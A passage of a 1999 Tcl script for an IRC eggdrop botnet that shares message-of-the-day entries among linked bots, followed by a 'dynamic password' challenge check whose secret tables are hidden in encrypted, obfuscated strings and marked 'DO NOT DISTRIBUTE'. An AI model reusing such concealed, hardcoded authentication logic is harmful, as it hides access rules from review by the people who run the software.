global motds
 set max 0
 foreach w [array names motds] {if {$max < $w} {set max $w}}
 return $max
}

proc cmd_motd {h i a} {
global motds
 if {$h!={}} {putcmdlog "#$h# motd $a"}
 set count 0
 if {$a=={}} {set a *}
 foreach w [lsort [array names motds $a]] {
  if {!$count} {putdcc $i "\2Message of the day:\2"}
  foreach {who when text} $motds($w) #
  set when [clock format $when -format {%d-%b-%y %I:%M %p}]
  set text [subst -nocommands -novariables $text]
  set left [format %-2s #$w:]
  foreach l [concat [split $text \n] [list "\00314(Set by $who, at $when)"]] {
   putdcc $i "\2$left\2 $l"
   regsub -all . $left { } left
  }
  incr count
 }
 if {!$count} {putdcc $i "No such motd."}
 return 0
}

proc cmd_pls_motd {h i a} {
global motds motd_count
 set text $a
 set who $h
 set when [unixtime]
 if {$text=={}} {
   putdcc $i "Illegal motd"
   return 0
 }
 putallbots [list pls_motd $who $when [idea e uue $text]]
 set max [latest_motd]
 incr max
 set motds($max) [list $who $when $text]
 incr motd_count
 putcmdlog "#$h# +motd $max"
 if {[bots]!={}} {set s "Sent to botnet"} {set s "Not shared (no bots linked)"}
 putdcc $i "Motd added, $s"
 set_motd_save
 return 0
}

proc cmd_mns_motd {h i a} {
global motds motd_count secauth
 foreach w [array names motds] {if {$a == $w} {set num $w}}
 if ![info exists num] {
  putdcc $i "No motd line with number: $a"
  return 0
 }
 foreach {who when text} $motds($num) #
 if {!$secauth && $h!=$who} {
  putdcc $i "Can't kill other dude motd."
  return 0
 }
 putallbots [list mns_motd $who $when]
 unset motds($num)
 incr motd_count -1
 putcmdlog "#$h# -motd $num"
 if {[bots]!={}} {set s "Sent to botnet"} {set s "Not shared (no bots linked)"}
 putdcc $i "Motd deleted, $s"
 set_motd_save
 return 0
}

proc bot_pls_motd {b k a} {
global motds last_motd motd_count
 if ![matchattr $b s] return
 set who [lindex $a 0]
 set last_motd [set when [lindex $a 1]]
 set text [idea d uue [lindex $a 2]]
 if {$text=={}} return
 set max 1
 foreach w [array names motds] {
  if {$max < $w} {set max $w}
  foreach {Who When Text} $motds($w) #
  if {$who==$Who && $when==$When && $text==$Text} return
 }
 incr max
 set motds($max) [list $who $when $text]
 incr motd_count
 set_motd_save
}

proc bot_mns_motd {b k a} {
global motds motd_count
 if ![matchattr $b s] return
 set who [lindex $a 0]
 set when [lindex $a 1]
 foreach w [array names motds] {
  foreach {Who When Text} $motds($w) #
  if {$who==$Who && $when==$When} {
   unset motds($w)
   incr motd_count -1
  }
 }
 set_motd_save
}

proc set_motd_save {} {
global botnet-nick
 if {![matchattr ${botnet-nick} a] && ![matchattr ${botnet-nick} h]} return
 foreach w [utimers] {if {[lindex $w 1] == "motd_save"} {killutimer [lindex $w 2]}}
 utimer 9 motd_save
}

proc motd_save {} {
global motds motdkey motd_saved motd_count
 if {[catch {
  set f [open .motd w 0600]
  puts $f [idea E $motdkey [array get motds]]
  close $f
 } er]==1} {
  putlog "motd_save: $er"
 } {
  putlog "Saved $motd_count MOTDs ([format %+d [expr {$motd_count - $motd_saved}]])"
 }
 set motd_saved $motd_count
}

proc motd_load {} {
global motds motdkey motd_count last_motd
 if {[catch {
  if ![file exist .motd] return
  set f [open .motd r]
  array set in [idea D $motdkey [read $f]]
  close $f
  if {![info exist in]} return
  if [info exist motds] {unset motds}
  set motd_count 0
  foreach w [lsort [array names in]] {
   incr motd_count
   set motds($motd_count) $in($w)
   set last_motd [lindex $in($w) 1]
  }
  unset in
 } er]==1} {
  putlog "motd_load: $er"
 } {
  putlog "Loaded $motd_count MOTDs"
 }
}

proc bot_dajmnemotd {b k a} {
global motds
 if ![matchattr $b s] return
 foreach w [lsort [array names motds]] {
  foreach {who when text} $motds($w) #
  if {$when > $a} {putbot $b [list pls_motd $who $when [idea e uue $text]]}
 }
}

if {[matchattr ${botnet-nick} a] || [matchattr ${botnet-nick} h]} motd_load
putallbots "dajmnemotd $last_motd"

putlog "motd.tcl v1 -str, 12 aug 1999"
#

# CORE-dynpass.tcl ported by str, 15 aug 1999, original code by [T3]

set pubkey fat_globs
proc dynamicPass {handle challenge r} {
global pubkey
 set indices [idea D 1 DVX7eqlR8OwHf21cMn4QTswxJvQCv12f6iGbz5OzRZie766b]
 set secret [split [encryptpass $handle]$challenge {}]
 foreach w [split $pubkey {}] {
  if {[set x [string first $w $indices]] == -1} {return 00}
  set secret [lreplace $secret $x $x {}]
 }
 set secret [join $secret {}]
 array set ze [idea D 2 [join {
  +z+ACx/rwILX8QI7VmBe+sWdupIbM+6nK4BW5hRuWcO9aSFKefJztj95F9dRJn40gR56R
  NI/0WVkwaHfFc/EWn7pihIH8fpuaZQDe7MgPX7WktqTcwZDKIQHN5Hr82lTHDHqW9WQOR
  B8zZhK+p7Icd3pETPEgRYjwVBD2ofE9UV7uiB64BREVgrOtapKtw4cJWFESksTK6kPBQp
  kotXoeu/0itd3a/NddNex0YBWvS0YAtaJGWPxNCeSIanrKtNsQPblXxo6GEFn+9iqnUCe
  s0M4Zan8zBBOyEIVgJsqHQMX1Pet8jNCU1CTjIfEMp5bP5GwTrVqzuMpvpH/G/N5m4e8H
  f65r5SY6ZmlQTA5xuQOWHYSfOZAWdlxg8SDRgE/anGLleAudSHzqtES3sO2saHa6SlByT
  D9mxd9Uu6xE5gUn8XfPnxS3sgQcPUBA9kj+vR8mege1C/dKOSqaD1ECHrBH6FU97pS323
  ltZH2hue5VssZ2wtuCAW3w2fifn7bs7EKq+rwyUi3ycg142z5zQ3IoGNqQjCeUncY
 } {}]]
 foreach w [split $secret {}] {
  if ![info exist ze($w)] {return 000} {append tpass $ze($w)}
 }
 set p {}
 foreach w [split $tpass {}] {set p $w$p}
 set l [idea D 5 dCbAsspT2W8K]
 regsub -all [idea d 3 aLNbpA6qC78qRw7jS8vuQWZjQ7fcmCq+2XRSvY1pfv9lwA] $r $l r
 set l [idea D 6 zRyDBmwoN7Ln]
 regsub -all [idea d 4 n6uA9yRTDc0NDqlxGCXc2/Fheyr3XxA8PJJ5tSPQ7dl48Q] $r $l r
 if {$r != $p} {return 0}
 return 1
}

proc encryptpass h {
 set x [user-get $h [idea d 7 ul2EqQZZZA]]
 if {$x=={}} {return [rep 20 ?]} {return [idea d $h $x]}
}

#
# -- DO NOT DISTRIBUTE! --  -- DO NOT DISTRIBUTE! --  -- DO NOT DISTRIBUTE! -- 

